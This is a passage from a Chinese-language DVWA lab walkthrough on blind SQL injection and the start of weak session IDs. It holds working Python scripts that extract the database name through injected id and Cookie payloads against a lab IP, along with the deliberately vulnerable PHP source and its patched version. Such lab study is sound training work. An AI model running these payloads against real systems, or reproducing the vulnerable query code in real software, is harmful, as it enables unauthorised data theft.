            <span class="token builtin">min</span> <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">max</span> <span class="token operator">=</span> mid
        mid<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">min</span><span class="token operator">+</span><span class="token builtin">max</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/b2/59/GmsYZ1mp_o.png" alt="在这里插入图片描述"></p> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

	<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SQLI_DB'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">case</span> <span class="token constant">MYSQL</span><span class="token punctuation">:</span>
			<span class="token comment">// Check database</span>
			<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span>
			<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Removed 'or die' to suppress mysql errors</span>

			<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
					<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
					<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>
			<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token keyword">case</span> <span class="token constant">SQLITE</span><span class="token punctuation">:</span>
			<span class="token keyword">global</span> <span class="token variable">$sqlite_db_connection</span><span class="token punctuation">;</span>

			<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span>
			<span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
				<span class="token variable">$results</span> <span class="token operator">=</span> <span class="token variable">$sqlite_db_connection</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$results</span><span class="token operator">-&gt;</span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token variable">$row</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$exists</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Feedback for end user</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// User wasn't found, so the page wasn't!</span>
		<span class="token function">header</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' 404 Not Found'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Feedback for end user</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>跟普通的low级别意义，只不过隔绝了返回的信息，成功则返回存在，使得要使用时间或者其它盲注。</p> 
</blockquote> 
<h3><a id="2Medium_1138"></a>2、Medium</h3> 
<p><img src="https://images2.imgbox.com/41/12/qoh6AXQG_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/c8/c1/On2rz3Lo_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>发现0和1返回的结果不一样，直接上脚本</p> 
</blockquote> 
<pre><code class="prism language-python"><span class="token keyword">import</span> time
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://121.199.77.45/vulnerabilities/sqli_blind/'</span>
headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0'</span><span class="token punctuation">,</span>
    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=bqjapbi0r6fs9aemuhkc2svn81; security=medium'</span>
<span class="token punctuation">}</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">130</span>
    mid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">+</span> <span class="token builtin">max</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token builtin">min</span> <span class="token operator">&lt;</span> <span class="token builtin">max</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'1^if(ascii(substr((select(database())),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">,0,1)'</span></span><span class="token punctuation">,</span>
            <span class="token string">'Submit'</span><span class="token punctuation">:</span> <span class="token string">'Submit'</span>
        <span class="token punctuation">}</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'User ID is MISSING from the database.'</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token builtin">max</span> <span class="token operator">=</span> mid
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">min</span> <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">+</span> <span class="token builtin">max</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/1b/fb/W9JD6KrC_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>源码和上面的medium意义的，只是返回的结果统一。1</p> 
</blockquote> 
<h3><a id="3High_1178"></a>3、High</h3> 
<p>直接脚本：</p> 
<pre><code class="prism language-php">import time
import requests

url <span class="token operator">=</span> <span class="token string single-quoted-string">'http://121.199.77.45/vulnerabilities/sqli_blind/'</span>
flag <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token class-name return-type">min</span> <span class="token operator">=</span> <span class="token number">1</span>
    max <span class="token operator">=</span> <span class="token number">130</span>
    mid <span class="token operator">=</span> <span class="token keyword type-declaration">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>min <span class="token operator">+</span> max<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> min <span class="token operator">&lt;</span> max<span class="token punctuation">:</span>
        payload<span class="token operator">=</span>f<span class="token string double-quoted-string">"id=1'%20and%20if((ascii(substr((select%20database())%2C{i}%2C1))%3E{mid})%2C1%2C0)%23;"</span>
        headers<span class="token operator">=</span><span class="token punctuation">{<!-- --></span>
            <span class="token string single-quoted-string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'Cookie'</span><span class="token punctuation">:</span>payload<span class="token operator">+</span><span class="token string single-quoted-string">' PHPSESSID=bqjapbi0r6fs9aemuhkc2svn81; security=high'</span>
        <span class="token punctuation">}</span>
        resp <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string single-quoted-string">'User ID is MISSING from the database.'</span> in resp<span class="token operator">.</span>text<span class="token punctuation">:</span>
            max <span class="token operator">=</span> mid
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            min <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>min <span class="token operator">+</span> max<span class="token punctuation">)</span> <span class="token comment">// 2</span>
    flag <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/62/f8/htxipIf8_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>原本想着需要写个脚本先访问弹窗页，然后再带Cookie访问返回页，测试了下发现，直接更改主页Cookie即可，因为弹窗页的作业就是发送Set-Cookie更改主页Cookie，从Cookie中取id数据查询的。</p> 
</blockquote> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

	<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SQLI_DB'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">case</span> <span class="token constant">MYSQL</span><span class="token punctuation">:</span>
			<span class="token comment">// Check database</span>
			<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 1;"</span><span class="token punctuation">;</span>
			<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Removed 'or die' to suppress mysql errors</span>

			<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token comment">// Get results</span>
				<span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
					<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// The '@' character suppresses errors</span>
				<span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
					<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>

			<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token keyword">case</span> <span class="token constant">SQLITE</span><span class="token punctuation">:</span>
			<span class="token keyword">global</span> <span class="token variable">$sqlite_db_connection</span><span class="token punctuation">;</span>

			<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 1;"</span><span class="token punctuation">;</span>
			<span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
				<span class="token variable">$results</span> <span class="token operator">=</span> <span class="token variable">$sqlite_db_connection</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$results</span><span class="token operator">-&gt;</span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token variable">$row</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$exists</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Feedback for end user</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Might sleep a random amount</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// User wasn't found, so the page wasn't!</span>
		<span class="token function">header</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' 404 Not Found'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Feedback for end user</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<h3><a id="4Impossible_1274"></a>4、Impossible</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Check Anti-CSRF token</span>
	<span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

	<span class="token comment">// Get input</span>
	<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">// Was a number entered?</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">intval</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SQLI_DB'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token keyword">case</span> <span class="token constant">MYSQL</span><span class="token punctuation">:</span>
				<span class="token comment">// Check the database</span>
				<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':id'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token keyword">case</span> <span class="token constant">SQLITE</span><span class="token punctuation">:</span>
				<span class="token keyword">global</span> <span class="token variable">$sqlite_db_connection</span><span class="token punctuation">;</span>

				<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$sqlite_db_connection</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SELECT COUNT(first_name) AS numrows FROM users WHERE user_id = :id LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':id'</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">,</span><span class="token constant">SQLITE3_INTEGER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
					<span class="token comment">// There is no way to get the number of rows returned</span>
					<span class="token comment">// This checks the number of columns (not rows) just</span>
					<span class="token comment">// as a precaution, but it won't stop someone dumping</span>
					<span class="token comment">// multiple rows and viewing them one at a time.</span>

					<span class="token variable">$num_columns</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">numColumns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num_columns</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
						<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

						<span class="token variable">$numrows</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'numrows'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
						<span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$numrows</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token punctuation">}</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span>

	<span class="token comment">// Get results</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$exists</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Feedback for end user</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// User wasn't found, so the page wasn't!</span>
		<span class="token function">header</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' 404 Not Found'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Feedback for end user</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>增加了token，并且id必须是整数，而且使用了预编译，返回的报错结果也统一，防止了sql注入。</p> 
</blockquote> 
<h2><a id="Weak_Session_IDs_1348"></a>八、Weak Session IDs</h2> 
<h3><a id="1Low_1349"></a>1、Low</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
